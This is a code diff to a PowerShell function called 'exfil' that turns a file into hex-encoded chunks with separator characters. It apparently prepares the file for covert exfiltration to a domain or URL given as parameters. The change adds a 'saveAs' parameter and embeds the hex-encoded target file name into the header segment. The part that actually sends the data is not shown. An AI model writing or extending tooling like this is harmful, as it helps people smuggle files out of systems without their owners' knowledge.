@@ -3,7 +3,8 @@ function exfil {
         [string]$regex,
         [string]$domain,
         [string]$url,
-        [string]$filepath
+        [string]$filepath,
+	[string]$saveAs
     )
 
 	function Convert-FileToHexChunks {
@@ -40,9 +41,11 @@ function exfil {
 			# Generate a random hex string of 8-16 characters for the first segment
 			$hexExt = [BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($ext)).Replace('-', '')
 
+			$hexName = [BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($saveAs))
+
 			# Randomly select a separator for the total number of segments
 			$totalSeparator = 'H'
-			$hexObject | Add-Member -MemberType NoteProperty -Name 1 -Value ('j' + $chunks.Count.ToString() + $totalSeparator + $hexExt + 'j')
+			$hexObject | Add-Member -MemberType NoteProperty -Name 1 -Value ('j' + $chunks.Count.ToString() + $totalSeparator + $hexExt + $totalSeparator + $hexName +'j')
 
 			for ($i = 0; $i -lt $chunks.Count; $i++) {
 				# Randomly select a separator from G, H, I for each chunk
